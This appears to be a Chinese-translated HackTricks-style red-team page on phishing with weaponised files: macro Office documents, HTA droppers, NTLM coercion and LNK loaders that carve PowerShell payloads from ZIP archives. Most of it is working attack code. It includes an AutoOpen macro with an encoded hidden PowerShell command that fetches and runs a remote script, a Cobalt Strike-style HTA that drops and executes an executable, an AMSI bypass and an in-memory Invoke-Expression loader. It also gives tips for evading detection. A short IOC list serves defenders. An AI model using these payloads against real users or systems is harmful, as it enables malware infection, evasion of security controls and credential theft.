# 钓鱼 文件与文档

{{#include ../../banners/hacktricks-training.md}}

## Office 文档

Microsoft Word 在打开文件之前会执行文件数据验证。数据验证以数据结构识别的形式，根据 OfficeOpenXML 标准执行。如果在数据结构识别过程中发生任何错误，被分析的文件将不会被打开。

通常，包含宏的 Word 文件使用 `.docm` 扩展名。然而，可以通过更改文件扩展名来重命名文件，同时仍保持其宏执行能力。\
例如，按设计，RTF 文件不支持宏，但将 DOCM 文件重命名为 RTF 后，Microsoft Word 仍会处理该文件并能够执行宏。\
相同的内部机制适用于 Microsoft Office Suite（Excel、PowerPoint 等）的所有软件。

你可以使用以下命令来检查哪些扩展名会被某些 Office 程序执行：
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### 外部图像加载

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros 后门

可以使用 macros 从文档中运行任意代码。

#### 自动加载函数

这些越常见，AV 检测到它们的可能性越大。

- AutoOpen()
- Document_Open()

#### Macros 代码示例
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 手动移除元数据

转到 **File > Info > Inspect Document > Inspect Document**，这会打开 Document Inspector。点击 **Inspect**，然后在 **Document Properties and Personal Information** 旁点击 **Remove All**。

#### 文档扩展名

完成后，选择 **Save as type** 下拉菜单，将格式从 **`.docx`** 更改为 **Word 97-2003 `.doc`**.\\  
之所以这样做，是因为你 **can't save macro's inside a `.docx`**，并且带有 macro-enabled **`.docm`** 扩展名存在一定的污名（例如，缩略图图标有一个巨大的 `!`，一些 web/email gateway 会完全阻止它们）。因此，这个 **传统 `.doc` 扩展名是最好的折衷**。

#### 恶意 Macros 生成器

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA 文件

HTA 是一个 Windows 程序，**combines HTML and scripting languages (such as VBScript and JScript)**。它生成用户界面并作为 "fully trusted" 应用执行，不受浏览器安全模型的约束。

HTA 通过 **`mshta.exe`** 执行，通常会随着 **Internet Explorer** 一起 **安装**，这使得 **`mshta` 依赖于 IE**。因此，如果它已被卸载，HTA 将无法执行。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## 强制 NTLM 验证

有多种方法可以**“远程”强制 NTLM 验证**，例如，你可以在用户会访问的邮件或 HTML 中添加**不可见图像**（甚至 HTTP MitM？）。或者将会在**打开文件夹**时就**触发**一次**身份验证**的**文件地址**发送给受害者。

**请在以下页面查看这些想法及更多内容：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

别忘了，你不仅可以窃取 hash 或 身份验证，还可以**perform NTLM relay attacks**：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

高效的攻击活动通常投放一个 ZIP，包含两个合法的诱饵文档（PDF/DOCX）和一个恶意 .lnk。技巧在于真正的 PowerShell loader 被存放在 ZIP 的原始字节中，在一个唯一标记之后，.lnk 会从中切割并在内存中完整运行它。

\.lnk PowerShell 单行命令实现的典型流程：

1) 在常见路径中定位原始 ZIP：Desktop、Downloads、Documents、%TEMP%、%ProgramData%，以及当前工作目录的父目录。  
2) 读取 ZIP 字节并查找硬编码标记（例如 xFIQCV）。标记之后的所有内容都是嵌入的 PowerShell payload。  
3) 将 ZIP 复制到 %ProgramData%，在那里解压，并打开诱饵 .docx 以显得合法。  
4) 为当前进程绕过 AMSI: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) 对下一阶段进行去混淆（例如，移除所有 # 字符）并在内存中执行它。

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
说明
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- 下一阶段通常会对 base64/XOR shellcode 进行解密，并通过 Reflection.Emit + VirtualAlloc 执行以最小化磁盘痕迹。

同一攻击链中使用的持久化
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. 详细信息和可直接使用的命令请见：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP 文件包含追加到归档数据的 ASCII 标记字符串（例如 xFIQCV）。
- .lnk 会枚举父/用户文件夹以定位 ZIP 并打开诱饵文档。
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- 以托管在受信任 PaaS 域下的链接结尾的长时间运行的业务线程。

## Windows files to steal NTLM hashes

查看关于 **places to steal NTLM creds** 的页面：

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
